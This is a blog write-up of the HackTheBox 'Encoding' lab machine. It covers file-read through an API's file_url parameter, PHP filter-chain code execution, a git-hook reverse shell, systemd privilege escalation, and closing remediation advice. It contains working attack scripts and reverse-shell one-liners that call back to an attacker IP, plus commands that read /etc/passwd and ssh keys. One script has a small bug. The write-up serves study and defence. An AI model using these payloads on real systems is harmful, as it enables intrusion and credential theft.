--- 
title: "HTB Encoding | Linux   Medium"
author: ""
date: 2023-04-26T01:19:00+02:00
description: ""
draft: false
disableComments: false
categories: []
series: [] #Taxonomy to list "See Also" Section in Opengraph Templates
tags: []
slug: ""
summary: ""
---
HackTheBox Encoding is a Linux machine rated Medium. This machine is flawed with software and data integrity failures(A08:2021), and injection(A03:2021).

Attack Chain: The attacker was able to gain an initial foothold due to directory traversal vulnerability, failed user input validation, and an improper implementation of php include function. Further exploiting an overly permissive right on a sensitive directory enabled the attacker’s gain root user privilege.
#### Initialization
```bash
# connect to vpn
sudo openvpn --auth-nocache --config lab_connection.ovpn
``` 

#### Enumeration
```bash
# discover ports and services
sudo nmap -p$(sudo nmap -sSU --min-rate 1000 10.10.11.198 | sed -nE 's/^([0-9]+)\/(tcp|udp).*$/\1/p' | paste -sd ",") -sSUVC --open -vvv 10.10.11.198 -oA nmap_encoding
xsltproc nmap_encoding.xml -o nmap_encoding.html             # converts xml to html
firefox nmap_encoding.html                                 # view in browser
---snip---
22/tcp open OpenSSH 8.9p1 Ubuntu 3ubuntu0.1   
80/tcp open Apache/2.4.52 (GET HEAD POST OPTIONS)  

# discover technologies used
whatweb 10.10.11.198      # if domain exits add to host file and rerun command
---snip---
Apache[2.4.52]
Bootstrap[3.4.1]
HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)
JQuery[3.6.0]
``` 

#### Exploration
Explored the site and discovered the /index.php takes a page parameter of values `string`, `integer`, `image`, and `api`. I am guessing it may be vulnerable to code injection, file inclusion or path traversal. 
![Home Source Page](/images/encoding/encoding01.png "Home Source Page")

Visted the `http://10.10.11.198/index.php?page=api` which appeared to be data conversion site. This page suggests a domain name for the api so we had to add that to the hosts file. 
```shell
# add domain and subdomain to hosts file
echo '10.10.11.198 haxtables.htb' | sudo tee -a /etc/hosts
echo "10.10.11.198 haxtables.htb" | sudo sed -i 's/haxtables.htb/& api.haxtables.htb/' /etc/hosts
```

#### Exploitation
Studied the page and figured that a few sample python scripts for calling the api could be a foothold vector. Collected these scripts and dubbed them as `str2hex-data_file.py`  and `str2hex-file_url.py`. The former was disclosing information on the attacker's machine while the latter when switched to the `file` scheme disclosed information on the victim's machine. 
[str2hex-data_file.py](#)
```python
import requests

data = {
  'action': 'str2hex'
}

f = {'data_file' : open('/etc/passwd', 'rb')}

response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', data=data, files=f)
print(response.text)
```
[str2hex-file_url.py](#)
```python
import requests

json_data = {
  'action': 'str2hex',
  'file_url' : 'file:///etc/passwd'
}

response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
print(response.text)
```
Create a wordlist of some interesting file paths in linux and modify `str2hex-file_url.py` to automate the dump of these files.
[modified-str2hex-file_url.py](#)
```python
import requests,sys

json_data = {
  'action': 'str2hex',
  'file_url': f'file://{sys.argv[1]}',
}

response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php',json=json_data)
print(response.text)
```
[file-extractor.sh](#)
```shell
# dump content of interesting files
for file in $(cat file_list); do python3 modified-str2hex-file_url.py $file | jq .data | xxd -r -p && echo ''; done 2>&1
```
Let's store and investigate the interesting files. Notice another subdomain `image.haxtables.htb` check it out. It throws a `403 Forbidden` error. 
```shell
# get /etc/passwd
python3 modified-str2hex-file_url.py /etc/passwd | jq .data | xxd -r -p | grep sh$
---snip---
root:x:0:0:root:/root:/bin/bash
svc:x:1000:1000:svc:/home/svc:/bin/bash

# get /etc/apache2/sites-enabled/000-default.conf
python3 modified-str2hex-file_url.py /etc/apache2/sites-enabled/000-default.conf | jq .data | xxd -r -p > 000-default.conf

# add the image subdomain to host file
echo "10.10.11.198 haxtables.htb" | sudo sed -i 's/haxtables.htb/& image.haxtables.htb/' /etc/hosts

# get /var/www/image/index.php
python3 modified-str2hex-file_url.py /var/www/image/index.php | jq .data | xxd -r -p > image/index.php

# get /var/www/image/utils.php
python3 modified-str2hex-file_url.py /var/www/image/utils.php | jq .data | xxd -r -p > image/utils.php

# get /var/www/image/scripts/git-commit.sh
python3 modified-str2hex-file_url.py /var/www/image/scripts/git-commit.sh | jq .data | xxd -r -p > image/scripts/git-commit.sh

# view .git/config
python3 modified-str2hex-file_url.py /var/www/image/.git/config | jq .data | xxd -r -p 
#--snip--#
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true

# view .git/logs/HEAD
python3 modified-str2hex-file_url.py /var/www/image/.git/logs/HEAD | jq .data | xxd -r -p
#--snip--#
0000000000000000000000000000000000000000 a85ddf4be9e06aa275d26dfaa58ef407ad2c8526 james <james@haxtables.htb> 1668104154 +0000	commit (initial): Initial commit
a85ddf4be9e06aa275d26dfaa58ef407ad2c8526 9c17e5362e5ce2f30023992daad5b74cc562750b james <james@haxtables.htb> 1668104210 +0000	commit: Updated scripts!

# view .git/index
python3 modified-str2hex-file_url.py /var/www/image/.git/index | jq .data | xxd -r -p | strings
#--snip--# store in files
actions/action_handler.php
actions/image2pdf.php
assets/img/forestbridge.jpg
includes/coming_soon.html
index.php
scripts/git-commit.sh
utils.php

# create corresponding directories and download the files
mkdir -p {actions,assets/img,includes,scripts}    # create all the sub directories
for file in $(cat files); do python3 modified-str2hex-file_url.py /var/www/image/$file | jq .data | xxd -r -p > ./image/$file; done 2>&1    # download the files

```
This is a very tricky one. I started a python server after creating a php reverse shell named 'index.php' and sent a curl request thus  `curl http://haxtables.htb/index.php?page=http://10.10.14.112:8008/index.php%00` which unfortunately returned haxtable's index.php page. Having earlier exfiltrated the  '000-default.conf' I switched to downloaded all the existing subdomain's index.php pages.

```shell
## let's download all php files
# downloading html -> haxtables contents
mkdir -p html/assets/{img,css,js}
python3 modified-str2hex-file_url.py /var/www/html/index.php | jq .data | xxd -r -p > ./html/index.php 

# downloading api -> api contents
mkdir -p api/v3/tools/string
python3 modified-str2hex-file_url.py /var/www/api/v3/tools/string/index.php | jq .data | xxd -r -p > ./api/v3/tools/string/index.php
```
With some understanding of the code and some research figured out a `curl` format for using the api and correctly passing the data. Also tried several variations of getting a shell on the box but this was unable to.
```php
# post request formats
curl -X POST -F "data_file=@index.php" -F "action=file_url" http://api.haxtables.htb/v3/tools/string/index.php

curl -X POST -H "Content-Type: application/json" -d '{"action": "md5", "data": "hello world"}' http://api.haxtables.htb/v3/tools/string/index.php

# with data_file
import requests

data = {
  'action': 'urldecode'
}

f = {'data_file' : __import__('webbrowser').open('http://10.10.11.198/index.php')}

response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', data=data, files=f)
print(response.text)
```
After a lot of trial had to lean on other's shared solution to get pass this blocker using [synactiv's php filter chain generator](https://github.com/synacktiv/php_filter_chain_generator).  Download the repository.

```shell
# download a gadget chain generator
git clone https://github.com/synacktiv/php_filter_chain_generator.git
```
Create a python script to exploit the action_handler.php `include` function.  
[attk.py](#)
```python
import requests,sys

json_data = {
  'action': 'b64encode',
  'file_url': f'image.haxtables.htb/actions/action_handler.php?page={sys.argv[1]}'
}

requests.post('http://api.haxtables.htb/v3/tools/string/index.php',json=json_data)
print(response.text)
```

```shell
# with a listener started on another terminal, generate the chain and execute the script
python3 ./php_filter_chain_generator/php_filter_chain_generator.py --chain '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.112/9007 0>&1 \""); ?>' | grep -E '^php:\/\/filter\/.*php:\/\/temp$' | xargs -I {} python3 attk.py {}

# upgrade to a full tty
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=xterm-256color; stty rows 38 columns 116; reset;

# view the rights on specified directory or file
getfacl -t .git
#--snip--#
# file: .git
USER   svc       rwx     
user   www-data  rwx     
GROUP  svc       r-x     
mask             rwx     
other            r-x

# create a git post commit hook with a reverse shell content having start a listener on 9008
printf '#!/bin/bash \nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.112 9008 >/tmp/f' > .git/hooks/post-commit
chmod +x .git/hooks/post-commit
touch /tmp/file
/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/tmp/ add /tmp/file
sudo -u svc /var/www/image/scripts/git-commit.sh

# with the svc user shell grab the ssh key and properly login into the box from attacker's machine
cat ~/.ssh/id_rsa
nano svc_key
chmod 400 svc_key
ssh -i svc_key svc@10.10.11.198
```

#### Escalation
```shell
sudo -l           # check this user's right
#--snip--#
User svc may run the following commands on encoding:
    (root) NOPASSWD: /usr/bin/systemctl restart *

# run the command
sudo /usr/bin/systemctl restart *
#--snip--#
Failed to restart user.txt.service: Unit user.txt.service not found.

ls -ld /etc/systemd/system/    # has extended permission
#--snip--#
drwxrwxr-x+ 22 root root 4096 Apr 25 20:06 /etc/systemd/system/

getfacl -t /etc/systemd/system
#--snip--#
# file: etc/systemd/system
USER   root      rwx     
user   svc       -wx     
GROUP  root      rwx     
mask             rwx     
other            r-x 

# craft an escalation script
printf '#!/bin/bash \nchmod +s /bin/bash' > /tmp/attack
chmod +x /tmp/attack

# create a malicious service
#--nano /etc/systemd/system/attack.service--#
[Unit]
Description=Privilege Escalation

[Service] 
ExecStart=/tmp/attack
Type=simple
Restart=always

[Install]
WantedBy=multi-user.target
#--/etc/systemd/system/attack.service--#

# re execute the command to escalate your privilege
sudo /usr/bin/systemctl restart attack
/bin/bash -p
cat /root/root.txt    # capture root flag
```

#### Exfiltration
There have been lots of exfiltration already, I however will collect the source code of in one piece.
```shell
python3 -m http.server 8005    # start a server on victim's machine
wget -R "index.html*" -c -r -L -p -nc -nH -P source  http://10.10.11.198:8005/   # download the source code on attacker's machine
codium source
```
#### Remediation
**Fixing the Foothold Vector**  
The inbuilt `parse_url` function in the code's `get_url_content` function which appears in all `utils.php` of the html,api, and image folders bypassed a check supposedly meant to deter an attack from manipulating the server.  However the notorious `include` in the `action_handler.php` of image's action folder facilitated the foothold on this box. 
![Encoding's Host File](/images/encoding/encoding02.png "Encoding's Host File")
Lets validate our assumptions with a local POC. [parse_url](https://www.php.net/manual/en/function.parse-url) strips the scheme while [gethostbyname](https://www.php.net/manual/en/function.gethostbyname) does an nslookup on the given domain. However passing the url to the `parse_url` function without the http scheme returns nothing which apparently has nothing to be compared against the "127.0.0.1" hence outputs a false value.
```php
php -a
// first run
php > echo (parse_url("http://image.haxtables.htb", PHP_URL_HOST)); // returns image.haxtables.htb
php > echo (gethostbyname("image.haxtables.htb")); // returns 127.0.0.1
php > $domain = parse_url("http://image.haxtables.htb", PHP_URL_HOST); echo (gethostbyname($domain) === "127.0.0.1") ? "true" : "false"; // returns true

// second run
php > echo (parse_url("image.haxtables.htb", PHP_URL_HOST)); // empty
php > echo (gethostbyname("")); // empty
php > $domain = parse_url("image.haxtables.htb", PHP_URL_HOST); echo (gethostbyname($domain) === "127.0.0.1") ? "true" : "false";  // returns false

// curl
php > $ch = curl_init();
php > curl_setopt($ch, CURLOPT_URL, "http://image.haxtables.htb"); echo (curl_exec($ch)); // returns contents of coming_soon.html in the image/includes folder
php > curl_setopt($ch, CURLOPT_URL, "image.haxtables.htb"); echo (curl_exec($ch)); // still returns contents of coming_soon.html in the image/includes folder
php > exit
```

The program on line 25  failed to used the already instantiated domain variable i.e `$domain` and instead used the initially passed `$url` variable in the curl_setopt and since the [curl_exec](https://www.php.net/manual/en/function.curl-exec) implicitly accepts a schemeless url argument the operation successfully executes. The simplest fix would be to pass the value of `$domain`. 
```php
17	function get_url_content($url)
18	{
19	    $domain = parse_url($url, PHP_URL_HOST);
20	    if (gethostbyname($domain) === "127.0.0.1") {
21		    echo jsonify(["message" => "Unacceptable URL"]);
22	    }
23	
24	    $ch = curl_init();
25	    curl_setopt($ch, CURLOPT_URL, $url);
26	    curl_setopt($ch,CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);
27	    curl_setopt ($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);
28	    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
29      curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
30	    $url_content =  curl_exec($ch);
31	    curl_close($ch);
32	    return $url_content;
33
34	}
```

**Fixing the Privilege Escalation Vector**  
This one is quite obtainable though where an administrator could give a developer right to restart their service. However they were also allowed to write to `/etc/systemd/system/`. 
```shell
ls -ld /etc/systemd/system
#--snip--#
drwxrwxr-x+ 22 root root 4096 Apr 25 22:50 /etc/systemd/system

setfacl -b /etc/systemd/system   # remove the extended permission
chmod go-w /etc/systemd/system  # remove the write permission

ls -ld /etc/systemd/system
#--snip--#
drwxr-xr-x 22 root root 4096 Apr 25 22:51 /etc/systemd/system
```

#### References
[PHP filters chain: What is it and How to Use It -Synacktive](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html) [PHP Wrappers - PHP Documentation](https://www.php.net/manual/en/wrappers.php.php) [PHP Functions - PHP Documentation](https://www.php.net/manual/en/funcref.php) 


---  
>I build secure and reliable infrastructures, hunt for flaws in insecure systems and remediate them to meet compliance. Book a consultation [session](https://calendly.com/samuelnwoye/10min).